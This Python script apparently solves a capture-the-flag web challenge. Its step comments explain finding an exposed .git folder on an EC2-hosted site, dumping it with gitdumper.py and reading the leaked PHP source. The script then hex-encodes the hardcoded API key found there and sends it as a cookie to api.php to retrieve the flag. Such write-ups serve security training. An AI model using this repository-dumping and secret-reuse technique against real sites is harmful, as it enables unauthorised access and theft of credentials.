import requests
session=requests.Session()
import binascii
url="http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/comrade/"

#Step1:After Doing a recon on the website,you will find out that a git folder is present in the 
# http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/comrade/.git

#Step2:Downloading the git folder so as to obtain the source code 
# gitdumper.py http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/comrade/ storeresulthere



#Step 3: Reading the source codes
"""
Information gathered

api.php
	if($_COOKIE['api_key'] == $apikey) 
	echo "Flag: $flag";

contact_process.php
	 $to = "comrade1995@gmail.com";
	 $access = bin2hex('this_is_top_secret');
	746869735f69735f746f705f736563726574
"""



#Step4:Using the api key we found in the api.php file
	# $access = bin2hex('this_is_top_secret');
	#We need to convert it to hex first

api_text='this_is_top_secret'
apikey=(binascii.hexlify(api_text.encode()).decode())
print(apikey)

#Step5:Send the requests to api.php with the apikey in the headers


custom_header={"Cookie":f"api_key={apikey}"}
page=url+'api.php'
print(page)
response=session.get(page,headers=custom_header)
content=response.text
flag=(content[(len(content)-25):])
print(flag)